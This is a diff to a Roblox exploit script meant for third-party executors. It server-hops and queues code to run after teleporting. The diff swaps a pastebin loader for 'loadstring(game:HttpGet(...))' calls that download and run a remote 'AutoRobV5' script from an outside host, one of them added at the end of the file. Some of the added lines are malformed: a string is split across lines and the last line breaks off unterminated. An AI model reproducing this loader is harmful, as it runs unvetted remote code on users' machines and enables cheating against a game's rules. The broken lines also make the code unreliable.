@@ -8,7 +8,7 @@ local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local KeepInfYield = true -- Ensure this variable is properly set as per your use case
 local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport -- Adjust for your executor compatibility
-local timerDuration = 200 
+local timerDuration = 300 
 local PlaceId = game.PlaceId
 local JobId = game.JobId
 local httprequest = syn and syn.request or http_request or request -- Adjust for your exploit compatibility
@@ -70,7 +70,8 @@ local function serverHopAndTeleport()
     if KeepInfYield and (not TeleportCheck) and queueteleport then
         print("[DEBUG] Conditions met. Setting TeleportCheck to true and queuing teleport.")
         TeleportCheck = true
-        queueteleport("loadstring(game:HttpGet('https://pastebin.com/raw/HYuVwnZK'))()")
+        queueteleport("loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV5'))()
+")
     else
         print("[DEBUG] Conditions not met. TeleportCheck: " .. tostring(TeleportCheck))
     end
@@ -93,3 +94,5 @@ Players.LocalPlayer.OnTeleport:Connect(function(State)
     print("[DEBUG] OnTeleport triggered with State: " .. tostring(State))
     serverHopAndTeleport()
 end)
+
+loadstring(game:HttpGet('http://scripts.projectauto.xyz/AutoRobV5
